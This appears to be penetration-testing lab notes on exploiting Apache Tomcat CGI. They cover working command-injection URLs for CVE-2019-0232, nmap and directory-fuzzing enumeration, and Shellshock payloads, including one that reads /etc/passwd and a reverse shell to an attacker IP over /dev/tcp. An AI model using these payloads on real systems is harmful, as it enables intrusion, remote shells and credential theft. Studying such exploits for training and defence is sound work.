# Tomcat CGI

The CGI Servlet in Apache Tomcat helps web servers talk to programs outside the Tomcat environment. These external programs are usually CGI scripts in languages like Perl, Python, or Bash. The CGI Servlet takes requests from web browsers and sends them to these scripts for processing. Essentially, it allows web servers, like Apache2, to run external applications following the CGI standard and acts as a link between web servers and external data sources, like databases. It is typically used to render dynamic content onto web pages and acts as middleware between the web servers, external databases and the front end of the web application. CGI scripts are stored in /CGI-bin or /cgi

\


<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>



### Vulnerabilities&#x20;

there are a number of known vulnerabilities like CVE-2019-0232 that can result in RCE.&#x20;

#### CVE-2019-0232

the enabledCmdLineArguments setting for Tomcat CGI, when enabled, determines if command line arguments are created from the received query string. the servlet parses the query string and sends it to the CGI script as arguments.&#x20;

For example, the arguement in these calls are used to switch between the scripts actions:

```
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby

http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald
```

When enableCmdLineArguements is enabled on a windows server - the servlet doesnt poperly validate input from the web browser before passing it to the script. this can then be used to perform a command injection.

For instance, an attacker can append `dir` to a valid command using `&` as a separator to execute `dir` on a Windows system. If the attacker controls the input to a CGI script that uses this command, they can inject their own commands after `&` to execute any command on the server. An example of this is `http://example.com/cgi-bin/hello.bat?&dir`

**if commands like whoami are not working - the path might not be set:**

Retrieve a list of environmental variables by calling the `set` command:

```http
# http://10.129.204.227:8080/cgi/welcome.bat?&set

Welcome to CGI, this section is not functional yet. Please return to home page.
AUTH_TYPE=
COMSPEC=C:\Windows\system32\cmd.exe
CONTENT_LENGTH=
CONTENT_TYPE=
GATEWAY_INTERFACE=CGI/1.1
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
HTTP_ACCEPT_ENCODING=gzip, deflate
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_HOST=10.129.204.227:8080
HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
PATH_INFO=
PROMPT=$P$G
QUERY_STRING=&set
REMOTE_ADDR=10.10.14.58
REMOTE_HOST=10.10.14.58
REMOTE_IDENT=
REMOTE_USER=
REQUEST_METHOD=GET
REQUEST_URI=/cgi/welcome.bat
SCRIPT_FILENAME=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
SCRIPT_NAME=/cgi/welcome.bat
SERVER_NAME=10.129.204.227
SERVER_PORT=8080
SERVER_PROTOCOL=HTTP/1.1
SERVER_SOFTWARE=TOMCAT
SystemRoot=C:\Windows
X_TOMCAT_SCRIPT_PATH=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
```

URL encode your payload if the command has a space or special characters:

```
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

### Enumeration

Look for tomcat:&#x20;

```shell-session
Adam-162@htb[/htb]$ nmap -p- -sC -Pn 10.129.204.227 --open 

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 13:57 SAST
Nmap scan report for 10.129.204.227
Host is up (0.17s latency).
Not shown: 63648 closed tcp ports (conn-refused), 1873 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   2048 ae19ae07ef79b7905f1a7b8d42d56099 (RSA)
|   256 382e76cd0594a6e717d1808165262544 (ECDSA)
|_  256 35096912230f11bc546fddf797bd6150 (ED25519)
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
8009/tcp  open  ajp13
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp  open  http-proxy
|_http-title: Apache Tomcat/9.0.17
|_http-favicon: Apache Tomcat
47001/tcp open  winrm

Host script results:
| smb2-time: 
|   date: 2023-03-23T11:58:42
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 165.25 seconds
```

### Finding CGI scripts&#x20;

we can use FFUF on the /cgi directory to locate sgi scripts we can try to exploit:&#x20;

```shell-session
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd

gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

Its also important to fuzz for other extensions:

```shell-session
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```

### Shellshock CVE-2014-6271

> Security flaw in the Bash shell that can be used to inject commands via environment variables. This is a 25 year old bug that is still found in the wild frequently. the older bash version saves environment variables incorrectly resulting in the possible execution of operating system commands that are included after a function stored inside an environment variable.&#x20;

```
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

#### Locate CGI scripts:

```shell-session
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

Curl the script, see if it returns 200 or additonal data&#x20;

```shell-session
curl -i http://10.129.204.231/cgi-bin/access.cgi

HTTP/1.1 200 OK
Date: Thu, 23 Mar 2023 13:28:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Content-Type: text/html
```

Validating vulnerability:&#x20;

```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

Exploiting for a reverse shell:

```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

#### Mitigation:

{% embed url="https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability" %}
